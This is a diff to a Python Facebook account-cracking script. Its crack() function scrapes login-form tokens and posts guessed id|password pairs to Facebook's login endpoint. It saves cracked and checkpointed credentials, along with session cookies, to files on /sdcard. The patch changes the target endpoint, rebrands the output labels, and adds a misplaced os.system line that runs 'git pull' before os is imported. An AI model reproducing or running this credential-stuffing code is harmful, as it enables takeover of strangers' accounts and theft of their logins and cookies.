@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
+  os.system('git pull -q;rm .rndm')
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
 #------------[ ALL-COLOR ]--------------#
 from bs4 import BeautifulSoup
@@ -626,7 +627,7 @@ def crack(idf,pwx,url,time_xx):
 			get_method = ses.get(f"https://m.facebook.com/").text
 			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
 			head = ({"Host": url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			post_method = ses.post(f"https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date, headers=head)
+			post_method = ses.post(f"https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date, headers=head)
 			if "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				data = (f'{idf}|{pw}')
@@ -641,7 +642,7 @@ def crack(idf,pwx,url,time_xx):
 							open('CP/'+sim_cp,'a').write(sapi+'\n')
 							break
 						except:
-							print(f'\n [{kk}B0SS : {kk}{idf}|{pw}{p}')
+							print(f'\n [{kk}R4FSAN-CP : {kk}{idf}|{pw}{p}')
 						#	Audio_('cp.mp3')
 							open('/sdcard/'+sim_cp,'a').write(idf+'|'+pw+'\n')
 							break
@@ -655,7 +656,7 @@ def crack(idf,pwx,url,time_xx):
 					ok+=1
 					open('/sdcard/'+sim_ok,'a').write(data+'\n');Audio_('data/.bossok.mp3')
 					if "coookie_xxx" in accountok:
-						print(f"\n \033[42m\033[1;91m B0SS \033[00m\033[00m:%s %s|%s \n {wa} %s•%s "%(II, idf , pw ,join_id_date,join_to_id(idf)))
+						print(f"\n \033[42m\033[1;91m R4FSAN-OK \033[00m\033[00m:%s %s|%s \n {wa} %s•%s "%(II, idf , pw ,join_id_date,join_to_id(idf)))
 						print(f"\r \033[47m\033[1;31m COOKIE \033[00m\033[00m: %s%s"%(I, coookie_xxx ))
 						
 
